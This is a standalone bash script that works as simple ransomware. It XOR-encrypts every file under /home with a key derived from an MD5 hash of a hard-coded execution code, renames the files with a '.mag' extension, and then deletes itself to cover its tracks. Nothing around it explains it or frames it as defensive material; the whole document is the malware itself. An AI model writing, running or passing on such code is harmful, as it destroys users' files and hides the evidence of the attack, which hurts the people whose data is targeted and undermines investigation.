#!/bin/bash

xor_encrypt_decrypt() {
    local file_path="$1"
    local key="$2"
    local temp_file="${file_path}.tmp"

    while IFS= read -r -n1 char || [[ -n "$char" ]]; do
        key_char=${key:$((i % ${#key})):1}
        printf \\$(printf '%03o' $(( $(printf '%d' "'$char") ^ $(printf '%d' "'$key_char") ))) >> "$temp_file"
        ((i++))
    done < "$file_path"

    mv "$temp_file" "$file_path"
}

generate_md5_hash() {
    echo -n "$1" | md5sum | awk '{print $1}'
}

derive_encryption_key() {
    local hash_value
    hash_value=$(generate_md5_hash "1777")
    echo "${hash_value: -4}"
}

validate_execution_key() {
    if [[ "$1" != "1777" ]]; then
        echo "Invalid execution key!"
        exit 1
    fi
}

encrypt_files() {
    local encryption_key="$1"
    local target_directory="$2"
    find "$target_directory" -type f 2>/dev/null | while read -r file; do
        local new_file="${file}.mag"
        xor_encrypt_decrypt "$file" "$encryption_key"
        mv "$file" "$new_file"
        echo "Encrypted: $new_file"
    done
}

self_delete() {
    local script_path="$0"
    rm -f "$script_path" && echo "Script $script_path has been deleted."
}

main() {
    validate_execution_key "$1"
    local encryption_key
    encryption_key=$(derive_encryption_key)
    local target_directory="/home"

    encrypt_files "$encryption_key" "$target_directory"
    self_delete
}

main "$@"
